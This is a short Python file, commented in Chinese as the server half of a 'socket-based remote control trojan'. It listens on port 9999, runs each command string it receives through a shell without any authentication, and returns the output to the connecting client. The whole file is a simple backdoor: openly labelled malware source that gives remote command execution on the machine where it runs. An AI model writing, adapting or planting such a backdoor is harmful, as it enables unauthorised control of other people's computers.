# 基于socket的远程控制木马
# server端
import shlex
from socket import socket
import subprocess


def run_command(com: str):
    return subprocess.run(shlex.split(com), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)


serv = socket()
serv.bind(('localhost', 9999))
# serv.bind('localhost')
serv.listen(5)
while True:
    print('等待连接...')
    tcp, _ = serv.accept()
    data = tcp.recv(1024)
    if not data:
        continue
    result = run_command(data.decode('utf-8'))
    if result.stderr.decode('gb2312'):
        tcp.send("命令执行失败".encode('utf-8'))
        continue
    tcp.send("【*】命令执行成功【*】\n".encode("utf-8") + result.stdout)
    tcp.close()
    print('客户端退出')
